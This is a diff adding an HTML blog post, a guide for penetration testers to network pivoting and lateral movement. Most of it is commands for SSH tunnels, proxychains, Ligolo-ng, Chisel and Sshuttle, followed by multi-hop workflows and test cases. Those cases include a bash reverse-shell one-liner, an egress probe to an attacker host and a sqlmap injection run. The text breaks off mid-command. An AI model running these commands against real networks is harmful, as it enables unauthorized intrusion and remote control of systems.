@@ -1,0 +1,759 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Network Pivoting & Lateral Movement: Advanced Techniques Guide</title>
+    <style>
+        :root {
+            --bg-primary: #0d1117;
+            --bg-secondary: #161b22;
+            --bg-tertiary: #21262d;
+            --text-primary: #c9d1d9;
+            --text-secondary: #8b949e;
+            --accent-primary: #58a6ff;
+            --accent-secondary: #1f6feb;
+            --border-color: #30363d;
+            --success: #3fb950;
+            --warning: #d29922;
+            --danger: #f85149;
+            --code-bg: #161b22;
+            --network-accent: #79c0ff;
+        }
+
+        [data-theme="light"] {
+            --bg-primary: #ffffff;
+            --bg-secondary: #f6f8fa;
+            --bg-tertiary: #eaeef2;
+            --text-primary: #24292f;
+            --text-secondary: #57606a;
+            --accent-primary: #0969da;
+            --accent-secondary: #0550ae;
+            --border-color: #d0d7de;
+            --success: #1a7f37;
+            --warning: #9a6700;
+            --danger: #cf222e;
+            --code-bg: #f6f8fa;
+            --network-accent: #0550ae;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Noto Sans', Helvetica, Arial, sans-serif;
+            background: var(--bg-primary);
+            color: var(--text-primary);
+            line-height: 1.8;
+            transition: background 0.3s ease, color 0.3s ease;
+        }
+
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 40px 20px;
+        }
+
+        .top-bar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 40px;
+        }
+
+        .back-link {
+            color: var(--accent-primary);
+            text-decoration: none;
+            font-size: 0.9rem;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .back-link:hover {
+            text-decoration: underline;
+        }
+
+        .theme-toggle {
+            background: var(--bg-secondary);
+            border: 1px solid var(--border-color);
+            color: var(--text-primary);
+            padding: 10px 20px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 0.9rem;
+            transition: all 0.2s ease;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .theme-toggle:hover {
+            background: var(--bg-tertiary);
+            border-color: var(--accent-primary);
+        }
+
+        .post-header {
+            margin-bottom: 50px;
+        }
+
+        .post-category {
+            display: inline-block;
+            padding: 8px 20px;
+            background: #ff8c42;
+            color: white;
+            border-radius: 25px;
+            font-size: 0.75rem;
+            font-weight: 600;
+            margin-bottom: 20px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .post-title {
+            font-size: 2.5rem;
+            margin-bottom: 20px;
+            color: var(--text-primary);
+            line-height: 1.2;
+        }
+
+        .post-meta {
+            display: flex;
+            gap: 20px;
+            color: var(--text-secondary);
+            font-size: 0.9rem;
+            padding-bottom: 30px;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .post-content {
+            font-size: 1.05rem;
+            line-height: 1.8;
+        }
+
+        .post-content h2 {
+            font-size: 1.8rem;
+            margin: 40px 0 20px 0;
+            color: var(--text-primary);
+        }
+
+        .post-content h3 {
+            font-size: 1.4rem;
+            margin: 30px 0 15px 0;
+            color: var(--text-primary);
+        }
+
+        .post-content h4 {
+            font-size: 1.1rem;
+            margin: 20px 0 10px 0;
+            color: var(--text-primary);
+        }
+
+        .post-content p {
+            margin-bottom: 20px;
+            color: var(--text-secondary);
+        }
+
+        .post-content ul, .post-content ol {
+            margin: 20px 0;
+            padding-left: 30px;
+        }
+
+        .post-content li {
+            margin-bottom: 10px;
+            color: var(--text-secondary);
+        }
+
+        .post-content code {
+            background: var(--code-bg);
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9em;
+            color: var(--accent-primary);
+        }
+
+        .post-content pre {
+            background: var(--bg-secondary);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 20px;
+            margin: 20px 0;
+            overflow-x: auto;
+        }
+
+        .post-content pre code {
+            background: transparent;
+            padding: 0;
+            color: var(--text-primary);
+            display: block;
+        }
+
+        .info-box {
+            background: var(--bg-secondary);
+            border-left: 4px solid var(--accent-primary);
+            padding: 20px;
+            margin: 30px 0;
+            border-radius: 4px;
+        }
+
+        .warning-box {
+            background: var(--bg-secondary);
+            border-left: 4px solid var(--warning);
+            padding: 20px;
+            margin: 30px 0;
+            border-radius: 4px;
+        }
+
+        .danger-box {
+            background: var(--bg-secondary);
+            border-left: 4px solid var(--danger);
+            padding: 20px;
+            margin: 30px 0;
+            border-radius: 4px;
+        }
+
+        .success-box {
+            background: var(--bg-secondary);
+            border-left: 4px solid var(--success);
+            padding: 20px;
+            margin: 30px 0;
+            border-radius: 4px;
+        }
+
+        .info-box h4, .warning-box h4, .danger-box h4, .success-box h4 {
+            margin-bottom: 10px;
+            color: var(--text-primary);
+        }
+
+        .tools-table {
+            background: var(--bg-secondary);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            margin: 20px 0;
+            overflow-x: auto;
+        }
+
+        .tools-table table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+
+        .tools-table th {
+            background: var(--bg-tertiary);
+            padding: 15px;
+            text-align: left;
+            color: var(--text-primary);
+            font-weight: 600;
+            border-bottom: 2px solid var(--border-color);
+        }
+
+        .tools-table td {
+            padding: 12px 15px;
+            border-bottom: 1px solid var(--border-color);
+            color: var(--text-secondary);
+        }
+
+        .tools-table tr:hover {
+            background: var(--bg-tertiary);
+        }
+
+        footer {
+            margin-top: 80px;
+            padding-top: 30px;
+            border-top: 1px solid var(--border-color);
+            text-align: center;
+            color: var(--text-secondary);
+            font-size: 0.9rem;
+        }
+
+        @media (max-width: 768px) {
+            .post-title {
+                font-size: 2rem;
+            }
+
+            .post-content h2 {
+                font-size: 1.5rem;
+            }
+
+            .post-content h3 {
+                font-size: 1.2rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="top-bar">
+            <a href="../index.html" class="back-link">← Back to Blog</a>
+            <button class="theme-toggle" onclick="toggleTheme()">
+                <span id="theme-icon">☀️</span>
+                <span id="theme-text">Light Mode</span>
+            </button>
+        </div>
+
+        <article>
+            <header class="post-header">
+                <span class="post-category">NETWORK SECURITY</span>
+                <h1 class="post-title">Network Pivoting & Lateral Movement: Advanced Techniques Guide</h1>
+                <div class="post-meta">
+                    <span>Published: Dec 2025</span>
+                </div>
+            </header>
+
+            <div class="post-content">
+                <p>Network pivoting and lateral movement are critical post-exploitation techniques that allow security professionals to navigate segmented networks, bypass firewalls, and gain access to systems that would otherwise be unreachable. After establishing an initial foothold, pivoting transforms a single compromised system into a gateway for deeper network penetration. This comprehensive guide covers SSH tunneling, port forwarding, proxy chains, advanced tools like Ligolo-ng, Chisel, and Sshuttle, along with practical workflows and detection evasion techniques essential for modern penetration testers.</p>
+
+                <h2>Core Concepts: Understanding Pivoting, Lateral Movement, and Tunneling</h2>
+
+                <h3>Definitions and Distinctions</h3>
+
+                <p><strong>Lateral Movement</strong> is the technique of moving from one system to another within a network environment to expand access and elevate privileges across multiple hosts. It focuses on spreading horizontally within the same network segment or trust zone.</p>
+
+                <p><strong>Pivoting</strong> is the process of using a compromised system as a foothold to access network segments that would otherwise be unreachable from the attacker's original position. It enables crossing network boundaries and firewalls by using an internal system as a relay or gateway.</p>
+
+                <p><strong>Tunneling</strong> is a technique that encapsulates network traffic within another protocol, creating a secure channel through which data can pass. It allows traffic to appear as benign communication while actually being used for unauthorized access or command and control (C2).</p>
+
+                <div class="info-box">
+                    <h4>💡 Key Distinction</h4>
+                    <p>Lateral Movement spreads your access across multiple systems in the same zone. Pivoting breaks through network boundaries using a compromised system. Tunneling is the mechanism enabling this movement by encapsulating traffic.</p>
+                </div>
+
+                <h2>Network Fundamentals for Pivoting</h2>
+
+                <h3>Essential Networking Concepts</h3>
+
+                <ul>
+                    <li><strong>Multiple Network Interfaces (NICs):</strong> Compromised systems may have access to multiple networks simultaneously</li>
+                    <li><strong>Routing Tables:</strong> Determine how packets reach their destination (use <code>route</code> or <code>ip route</code>)</li>
+                    <li><strong>Network Segmentation:</strong> DMZ, Internal Networks, Management Networks with varying access levels</li>
+                    <li><strong>Firewall Rules:</strong> Inbound/outbound restrictions that pivoting must bypass or work around</li>
+                    <li><strong>Trust Relationships:</strong> Systems within the same trust zone often have weaker authentication</li>
+                </ul>
+
+                <h3>Reconnaissance Before Pivoting</h3>
+
+                <pre><code># Identify available network interfaces
+ip addr show
+ifconfig
+
+# Check routing table
+ip route
+route -n
+
+# Identify other systems on connected networks
+arp -a
+ip neigh show
+
+# Network scanning from pivot point
+nmap -sL 192.168.1.0/24  # List targets
+nmap -Pn -sT 192.168.1.0/24  # TCP connect scan (no ICMP)</code></pre>
+
+                <h2>SSH Port Forwarding: The Foundation of Pivoting</h2>
+
+                <h3>Local Port Forwarding</h3>
+
+                <p>Local port forwarding creates a listening port on your attacking machine that forwards traffic through the SSH tunnel to a remote system. This is useful when you know exactly which service you want to access.</p>
+
+                <pre><code># Basic syntax
+ssh -L local_port:target_ip:target_port user@ssh_server
+
+# Example: Access internal web server
+ssh -L 8080:192.168.1.50:80 pivot_user@10.10.10.50
+
+# Access internal database
+ssh -L 3306:192.168.1.100:3306 pivot_user@10.10.10.50
+
+# Using SSH key
+ssh -i /path/to/key -L 8080:192.168.1.50:80 pivot_user@10.10.10.50
+
+# Background the tunnel with -N and -f flags
+ssh -N -f -L 8080:192.168.1.50:80 pivot_user@10.10.10.50
+
+# Now access locally
+curl http://localhost:8080
+mysql -h 127.0.0.1 -P 3306 -u root -p</code></pre>
+
+                <h3>Remote Port Forwarding</h3>
+
+                <p>Remote port forwarding is the reverse: the SSH server (pivot) listens on a port and forwards traffic back to your attacking machine. This is essential for catching reverse shells.</p>
+
+                <pre><code># Basic syntax
+ssh -R remote_bind_port:local_ip:local_port user@ssh_server
+
+# Example: Catch reverse shell on attacker machine
+# On attacker machine (must have SSH running):
+sudo systemctl start ssh
+
+# On pivot machine with shell access:
+ssh -R 4444:127.0.0.1:4444 attacker@attacker_ip
+
+# Now on attacker:
+nc -lvnp 4444  # Listen for reverse shell
+
+# Reverse shell from target sends to pivot:4444 which forwards to attacker:4444</code></pre>
+
+                <h3>Dynamic Port Forwarding (SOCKS Proxy)</h3>
+
+                <p>Dynamic port forwarding creates a SOCKS5 proxy that can forward traffic to any destination dynamically. This is more flexible than static forwarding.</p>
+
+                <pre><code># Create SOCKS5 proxy on local port 9050
+ssh -D 9050 -N pivot_user@10.10.10.50
+
+# Or with key authentication
+ssh -i /path/to/key -D 9050 -N pivot_user@10.10.10.50
+
+# Now configure applications to use the proxy:
+# 1. Using proxychains:
+proxychains -f /etc/proxychains.conf curl http://192.168.1.10
+
+# 2. Using Firefox:
+# Settings > Network > SOCKS > 127.0.0.1:9050
+
+# 3. Using with nmap through proxychains:
+proxychains -q nmap -Pn -sT 192.168.1.0/24 -p 80,443</code></pre>
+
+                <h2>Proxychains: Making Tools Proxy-Aware</h2>
+
+                <h3>Configuration Setup</h3>
+
+                <pre><code># Install proxychains (if not already installed)
+sudo apt-get install proxychains4
+
+# Edit configuration
+sudo nano /etc/proxychains4.conf
+
+# Key settings to enable/modify:
+# Uncomment "dynamic_chain" (comment out strict_chain and random_chain)
+# At the end, add your SOCKS proxy:
+socks5 127.0.0.1 9050</code></pre>
+
+                <h3>Using Proxychains with Tools</h3>
+
+                <pre><code># Basic usage - prepend proxychains to any command
+proxychains curl http://192.168.1.10
+
+# Port scanning through proxy
+proxychains -q nmap -Pn -sT 192.168.1.0/24 -p 22,80,443,3389
+
+# RDP through proxy
+proxychains xfreerdp /v:192.168.1.50 /u:username /p:password
+
+# SMB enumeration through proxy
+proxychains smbclient -L \\\\192.168.1.100\\
+
+# SSH to internal host
+proxychains ssh user@192.168.1.150</code></pre>
+
+                <h3>Proxychains Performance Tips</h3>
+
+                <pre><code># Edit /etc/proxychains4.conf:
+
+# 1. Enable quiet mode to reduce spam
+quiet_mode
+
+# 2. Remove "random_chain" and "strict_chain"
+#    Leave only "dynamic_chain"
+
+# 3. Add localnet exclusions to avoid looping
+localnet 127.0.0.0/255.0.0.0
+
+# 4. Use -q flag for quiet output
+proxychains -q [command]</code></pre>
+
+                <h2>Advanced Pivoting Tools</h2>
+
+                <h3>Ligolo-ng: The Modern VPN Tunneling Solution</h3>
+
+                <p>Ligolo-ng is a next-generation pivoting tool that creates TUN-based tunnels, eliminating the need for SOCKS proxies and offering superior performance.</p>
+
+                <div class="tools-table">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Aspect</th>
+                                <th>Ligolo-ng</th>
+                                <th>Chisel</th>
+                                <th>Sshuttle</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td><strong>Tunnel Type</strong></td>
+                                <td>TUN Interface (VPN-like)</td>
+                                <td>HTTP + SOCKS5</td>
+                                <td>VPN over SSH</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Requires Proxy Config</strong></td>
+                                <td>No</td>
+                                <td>Yes (proxychains)</td>
+                                <td>No</td>
+                            </tr>
+                            <tr>
+                                <td><strong>OS Support</strong></td>
+                                <td>Windows, Linux, macOS</td>
+                                <td>Windows, Linux, macOS</td>
+                                <td>Linux only</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Performance</strong></td>
+                                <td>Excellent (native TCP/UDP)</td>
+                                <td>Good (HTTP tunneled)</td>
+                                <td>Very Good</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Learning Curve</strong></td>
+                                <td>Easy</td>
+                                <td>Moderate</td>
+                                <td>Moderate</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+
+                <h4>Single Pivot with Ligolo-ng</h4>
+
+                <pre><code># Step 1: Start Ligolo-ng proxy on attacker machine
+./ligolo-ng_proxy -selfcert -laddr 0.0.0.0:11601
+
+# Step 2: Transfer agent to pivot machine
+# Download appropriate binary (agent_Linux_64bit, agent.exe, etc.)
+
+# Step 3: Execute agent to connect back to attacker
+./agent -connect attacker_ip:11601 -ignore-cert
+
+# Step 4: On attacker, in Ligolo interactive console:
+ligolo-ng » session                    # List available sessions
+ligolo-ng » session 1                  # Select session
+[Agent : 1] » interface_create --name lig0
+[Agent : 1] » tunnel_start --tun lig0
+
+# Step 5: Add route on attacker machine
+sudo ip route add 192.168.1.0/24 dev lig0
+
+# Step 6: Now directly access the internal network without proxychains!
+nmap -Pn -sT 192.168.1.0/24 -p 80,443
+ssh user@192.168.1.50
+mssqlclient.py -windows-auth username@192.168.1.100</code></pre>
+
+                <h4>Double Pivoting with Ligolo-ng</h4>
+
+                <pre><code># After first pivot tunnel is established:
+# 1. RDP/SSH into second machine in new network (172.16.5.0/24)
+# 2. Transfer agent binary to this new machine
+# 3. Execute agent pointing back to first pivot machine:
+
+./agent -connect 192.168.1.50:11601 -ignore-cert
+
+# 4. Back on attacker, add new listener:
+[Agent : 1] » listener_add --addr 0.0.0.0:11602 --to 127.0.0.1:11602
+
+# 5. On second pivot machine (accessed via first pivot), run second agent:
+./agent -connect attacker_ip:11602 -ignore-cert
+
+# 6. Manage second session:
+ligolo-ng » session 2
+[Agent : 2] » interface_create --name lig1
+[Agent : 2] » tunnel_start --tun lig1
+[Agent : 2] » route add 172.16.5.0/24
+
+# 7. On attacker:
+sudo ip route add 172.16.5.0/24 dev lig1
+
+# Now you have access to both networks without proxychains!</code></pre>
+
+                <h3>Chisel: Flexible HTTP Tunneling</h3>
+
+                <pre><code># Server side (attacker machine)
+./chisel server -p 8000 -v
+
+# Client side (pivot machine) - create SOCKS5 proxy
+./chisel client attacker_ip:8000 socks
+
+# Or with reverse SOCKS (client initiates)
+./chisel server -p 8000 --reverse
+./chisel client attacker_ip:8000 R:socks
+
+# Specific port forwarding
+./chisel client attacker_ip:8000 8080:192.168.1.50:80
+
+# Use with proxychains
+proxychains nmap -Pn -sT 192.168.1.0/24</code></pre>
+
+                <h3>Sshuttle: VPN-like SSH Tunneling</h3>
+
+                <pre><code># Basic usage - automatic subnet detection
+sshuttle -vr user@pivot_ip
+
+# Specify network explicitly
+sshuttle -vr user@pivot_ip 192.168.1.0/24 172.16.0.0/16
+
+# With password (using sshpass)
+sshuttle -vr user@pivot_ip 192.168.1.0/24 -e "sshpass -p 'password' ssh"
+
+# With SSH key
+sshuttle -vr user@pivot_ip 192.168.1.0/24 -e "ssh -i /path/to/key"
+
+# Exclude certain traffic
+sshuttle -vr user@pivot_ip 192.168.1.0/24 -x attacker_ip
+
+# After connection, use tools normally without proxychains:
+nmap -Pn -sT 192.168.1.0/24
+ssh user@192.168.1.50</code></pre>
+
+                <h2>Practical Exploitation Workflows</h2>
+
+                <h3>Workflow 1: Simple SSH Local Port Forwarding</h3>
+
+                <pre><code># Scenario: Web server on 192.168.1.50:80 accessible only from pivot
+
+# Step 1: Create SSH tunnel
+ssh -L 8080:192.168.1.50:80 -N pivot_user@pivot_ip
+
+# Step 2: Access in browser
+# Navigate to http://localhost:8080
+
+# Step 3: Interact through tunnel
+curl -v http://localhost:8080
+sqlmap -u "http://localhost:8080/search?q=*" -p q --batch</code></pre>
+
+                <h3>Workflow 2: SOCKS Proxy + Proxychains Reconnaissance</h3>
+
+                <pre><code># Step 1: Create SOCKS proxy
+ssh -D 9050 -N pivot_user@pivot_ip
+
+# Step 2: Verify proxychains configuration
+cat /etc/proxychains4.conf | grep -A 5 "^socks5"
+
+# Step 3: Perform network reconnaissance
+proxychains -q nmap -Pn -sT 192.168.1.0/24 -p 22,80,443,3389,3306 --open
+
+# Step 4: Identify targets and enumerate
+proxychains smbclient -L \\\\192.168.1.100\\
+
+# Step 5: Access identified services
+proxychains xfreerdp /v:192.168.1.200 /u:admin /p:password</code></pre>
+
+                <h3>Workflow 3: Multi-Hop Pivoting with Ligolo-ng</h3>
+
+                <pre><code># Scenario: Compromise path: Attacker -> Pivot1 -> Pivot2 -> Target Network
+
+# Phase 1: Initial foothold on Pivot1 (10.10.10.50)
+# [Establish shell on Pivot1]
+
+# Phase 2: Set up first tunnel
+./ligolo-ng_proxy -selfcert -laddr 0.0.0.0:11601  # On attacker
+./agent -connect attacker_ip:11601 -ignore-cert    # On Pivot1
+
+# Phase 3: Route to Pivot1 network
+ligolo-ng » session 1
+[Agent : 1] » interface_create --name lig0
+[Agent : 1] » tunnel_start --tun lig0
+sudo ip route add 192.168.1.0/24 dev lig0
+
+# Phase 4: Laterally move to Pivot2 (192.168.1.100) via Pivot1
+# RDP/SSH into Pivot2 through tunnel
+
+# Phase 5: Set up second tunnel
+# Add new listener on Pivot1
+[Agent : 1] » listener_add --addr 0.0.0.0:11602 --to 127.0.0.1:11602
+
+# Execute second agent on Pivot2
+./agent -connect 192.168.1.100:11602 -ignore-cert
+
+# Phase 6: Manage second session
+ligolo-ng » session 2
+[Agent : 2] » interface_create --name lig1
+[Agent : 2] » tunnel_start --tun lig1
+[Agent : 2] » route add 172.16.5.0/24
+sudo ip route add 172.16.5.0/24 dev lig1
+
+# Phase 7: Access final target network
+nmap -Pn -sT 172.16.5.0/24 -p 445,3389
+mssqlclient.py -windows-auth admin@172.16.5.50</code></pre>
+
+                <h2>Test Cases for Pivoting Engagements</h2>
+
+                <h3>TC-PIVOT-001: Network Interface Enumeration</h3>
+
+                <pre><code>Objective: Identify all network interfaces on compromised system
+Steps:
+  1. Execute: ip addr show
+  2. Execute: route -n
+  3. Execute: arp -a
+  4. Document all networks system is connected to
+  5. Verify bidirectional connectivity to each network
+
+Expected: System connected to multiple networks with different IP ranges
+Pass Criteria: Can communicate with systems in each identified network</code></pre>
+
+                <h3>TC-PIVOT-002: Firewall Rule Enumeration</h3>
+
+                <pre><code>Objective: Identify firewall rules limiting egress traffic
+Steps:
+  1. From pivot, attempt connections to attacker on various ports:
+     for port in 80 443 8080 8443 4444 9050; do
+       timeout 2 bash -c "echo > /dev/tcp/attacker_ip/$port" && echo "Port $port open"
+     done
+  2. Identify which ports allow outbound traffic
+  3. Prioritize HTTPS (443) and HTTP (80) as most likely open
+  
+Expected: Some ports are filtered, others are open
+Pass Criteria: Identified at least one usable outbound port</code></pre>
+
+                <h3>TC-PIVOT-003: SSH Tunnel Establishment</h3>
+
+                <pre><code>Objective: Successfully establish SSH tunnel to internal network
+Steps:
+  1. From pivot machine, execute:
+     ssh -L 8080:192.168.1.50:80 -N attacker@attacker_ip
+  2. From attacker, verify tunnel:
+     curl -v http://localhost:8080
+  3. Verify traffic flows through tunnel:
+     tcpdump on pivot shows traffic
+
+Expected: HTTP 200 response from internal web server
+Pass Criteria: Can access internal service through tunnel</code></pre>
+
+                <h3>TC-PIVOT-004: SOCKS Proxy Functionality</h3>
+
+                <pre><code>Objective: Validate SOCKS proxy forwards traffic correctly
+Steps:
+  1. Create SOCKS proxy: ssh -D 9050 -N user@pivot_ip
+  2. Configure proxychains with: socks5 127.0.0.1 9050
+  3. Execute proxychains test:
+     proxychains -q nmap -Pn -sT 192.168.1.10 -p 80
+  4. Verify nmap connects through proxy
+  
+Expected: Nmap scan results from internal network
+Pass Criteria: Successfully identified open ports on internal system</code></pre>
+
+                <h3>TC-PIVOT-005: Reverse Shell Through Pivot</h3>
+
+                <pre><code>Objective: Catch reverse shell from target through pivot machine
+Setup:
+  1. On attacker machine: sudo systemctl start ssh
+  2. On pivot machine: ssh -R 4444:127.0.0.1:4444 attacker@attacker_ip
+  3. On attacker: nc -lvnp 4444
+  4. Execute reverse shell from target:
+     bash -i >& /dev/tcp/pivot_ip/4444 0>&1
+  
+Expected: Shell session established on attacker machine
+Pass Criteria: Can execute commands from attacker to target</code></pre>
+
+                <h3>TC-PIVOT-006: Ligolo-ng Tunnel Creation</h3>
+
+                <pre><code>Objective: Establish Ligolo-ng tunnel and verify network access
+Steps:
+  1. Start proxy: ./ligolo-ng_proxy -selfcert -laddr 0.0.0.0:11601
+  2. Execute agent on pivot: ./agent -connect attacker:11601 -ignore-cert
+  3. In Ligolo console:
+     session 1
+     interface_create --name lig0
+     tunnel_start --tun lig0
+  4. On attacker: sudo ip route add 192.168.1.0/24 dev lig0
+  5. Verify: ping -c 1
